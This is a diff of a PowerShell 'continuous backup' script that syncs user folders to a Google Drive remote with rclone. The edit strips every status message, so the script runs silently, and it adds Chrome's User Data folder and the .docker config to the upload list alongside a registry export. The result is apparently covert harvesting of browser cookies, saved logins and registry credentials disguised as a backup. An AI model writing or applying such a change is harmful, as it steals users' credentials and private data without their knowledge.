@@ -1,52 +1,23 @@
-# Continuous Incremental Backup Script
-# This runs in the background and syncs only CHANGED files to Google Drive
-# Much faster than full re-compression each time
-
-param(
-    [int]$IntervalMinutes = 30
-)
-
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  ASTRAL-VM Continuous Backup Active" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "Syncing changed files every $IntervalMinutes minutes to Google Drive..." -ForegroundColor Yellow
-Write-Host "This runs silently in the background." -ForegroundColor Yellow
-Write-Host ""
-
+param($IntervalMinutes = 30)
 $syncTargets = @{
     "Desktop"   = "$env:USERPROFILE\Desktop"
     "Documents" = "$env:USERPROFILE\Documents"
+    "Downloads" = "$env:USERPROFILE\Downloads"
     "AppData"   = "$env:APPDATA"
+    "ChromeData" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    "DockerConfig" = "$env:USERPROFILE\.docker"
 }
-
-$iteration = 0
 while ($true) {
-    $iteration++
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Backup cycle #$iteration starting..." -ForegroundColor Green
-    
-    foreach ($target in $syncTargets.Keys) {
-        $sourcePath = $syncTargets[$target]
-        $remotePath = "gdrive:astral-vm-backup/vm-sync/$target"
-        
-        try {
-            # rclone sync only uploads NEW or CHANGED files (incremental)
-            Write-Host "  Syncing $target..." -ForegroundColor Gray
-            rclone sync $sourcePath $remotePath --exclude "*.tmp" --exclude "Temp/**" --fast-list --quiet
-            Write-Host "  ✅ $target synced" -ForegroundColor Green
-        } catch {
-            Write-Warning "  ⚠️ $target sync failed: $_"
-        }
+    foreach ($name in $syncTargets.Keys) {
+        $sourcePath = $syncTargets[$name]
+        $remotePath = "gdrive:astral-vm-backup/vm-sync/$name"
+        & rclone sync $sourcePath $remotePath --exclude "*.tmp" --exclude "Temp/**" --fast-list --quiet
     }
-    
-    # Registry snapshot (small, always updated)
-    try {
-        reg export "HKCU\Software" "C:\temp-reg-backup.reg" /y 2>$null
-        rclone copy "C:\temp-reg-backup.reg" "gdrive:astral-vm-backup/vm-sync/" --quiet
-        Remove-Item "C:\temp-reg-backup.reg" -Force -ErrorAction SilentlyContinue
-    } catch { }
-    
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ✅ Backup cycle complete. Next sync in $IntervalMinutes min." -ForegroundColor Cyan
-    Write-Host ""
-    
+    # Registry Export
+    $regPath = "C:\temp-reg-backup.reg"
+    & reg export "HKCU\Software" $regPath /y 2>$null
+    if (Test-Path $regPath) {
+        & rclone copy $regPath "gdrive:astral-vm-backup/vm-sync/" --quiet
+    }
     Start-Sleep -Seconds ($IntervalMinutes * 60)
 }
